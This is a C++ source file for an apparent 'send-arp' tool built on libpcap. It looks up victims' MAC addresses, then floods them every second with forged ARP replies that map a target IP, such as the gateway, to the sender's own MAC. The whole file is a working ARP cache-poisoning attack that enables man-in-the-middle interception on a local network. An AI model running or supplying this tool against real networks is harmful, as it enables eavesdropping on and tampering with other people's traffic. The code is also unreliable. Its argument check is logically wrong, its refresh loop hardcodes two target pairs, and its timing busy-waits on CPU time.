#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/ioctl.h>

#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <map>
#include <time.h>
#include <vector>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

Mac getMACAddress(const char* interface) {
    struct sockaddr_in *addr;
    struct ifreq ifr;

    // 소켓 생성
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    // 인터페이스 설정
    strncpy(ifr.ifr_name, interface, IFNAMSIZ); // 인터페이스 이름 설정

    // MAC 주소 가져오기
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        exit(1);
    }

    close(sock);

    char macAddrStr[18];
    sprintf(macAddrStr, "%02X:%02X:%02X:%02X:%02X:%02X",
             (unsigned char)ifr.ifr_hwaddr.sa_data[0],
             (unsigned char)ifr.ifr_hwaddr.sa_data[1],
             (unsigned char)ifr.ifr_hwaddr.sa_data[2],
             (unsigned char)ifr.ifr_hwaddr.sa_data[3],
             (unsigned char)ifr.ifr_hwaddr.sa_data[4],
             (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
    
    return Mac(macAddrStr);
}

EthArpPacket make_arp_packet(Mac dst_mac, Mac src_mac, uint16_t operation, Mac smac, Ip sip, Mac tmac, Ip tip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = dst_mac;
    packet.eth_.smac_ = src_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(operation);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);
    
    return packet;
}


Mac arp_request(Ip sender_ip, Ip receiver_ip, Mac receiver_mac, pcap_t* handle) {
    EthArpPacket packet = make_arp_packet(Mac("ff:ff:ff:ff:ff:ff"), receiver_mac, 
    					  ArpHdr::Request, receiver_mac, 
    					  receiver_ip, Mac("00:00:00:00:00:00"), 
    					  sender_ip);
    
    for (int i=0; i<3; i++) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            exit(1);
        
        }
        
        sleep(1);
        printf("request arp...\n");
    }
    
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        
        memcpy(&packet, recv_packet, sizeof(EthArpPacket));
        if (packet.eth_.type_ != htons(EthHdr::Arp)) continue;
        if ((uint32_t)packet.arp_.sip_ == htonl(Ip(sender_ip))) {
            //printf("Victim MAC = %s\n", std::string(packet.arp_.smac_).c_str());
            break;
        }
    }
        
    return Mac(packet.arp_.smac_);
}

void arp_reply(Ip sender_ip, Ip receiver_ip, Mac sender_mac, Mac receiver_mac, pcap_t* handle) {
    EthArpPacket packet = make_arp_packet(sender_mac, receiver_mac, 
    					  ArpHdr::Reply, sender_mac, 
    					  sender_ip, receiver_mac, 
    					  receiver_ip);
        
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(1);
    }
}



void usage() {
    printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if ((argc < 4) && (argc % 2 != 0)) {
        usage();
        return -1;
    }
    
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    const char* interface = argv[1];
    Mac reciever_mac;
    Mac sender_mac;
    std::vector<Mac> sender_mac_array;

    for (int i=2; i<argc; i+=2) {
        reciever_mac = getMACAddress(interface);
        std::string receiver_mac_print = (std::string)reciever_mac;
        printf("Receiver MAC = %s\n", receiver_mac_print.c_str());
      
        sender_mac = arp_request(Ip(argv[i]), Ip(argv[i+1]), reciever_mac, handle);
        std::string sender_mac_print = (std::string)sender_mac;
        printf("Sender MAC = %s\n", sender_mac_print.c_str());
        sender_mac_array.push_back(sender_mac);

        arp_reply(Ip(argv[i]), Ip(argv[i+1]), sender_mac, reciever_mac, handle);
        printf("%d done\n", i/2);
        printf("====================\n");
    }
    
    clock_t start, finish;
    double duration = 0;
    
    start = clock();
     
    while (true) {
        finish = clock();
        duration = (double)(finish-start) / CLOCKS_PER_SEC;
        
        if (duration > 1.0) {
            printf("%f\n", duration);
            arp_reply(Ip(argv[2]), Ip(argv[3]), sender_mac_array[0], reciever_mac, handle);
            arp_reply(Ip(argv[4]), Ip(argv[5]), sender_mac_array[1], reciever_mac, handle);
            printf("reply\n");
            start = finish;
        }
    }


    printf("%s\n",((std::string)sender_mac_array[0]).c_str());
    printf("%s\n",((std::string)sender_mac_array[1]).c_str());
    pcap_close(handle);
    printf("all done\n");
}

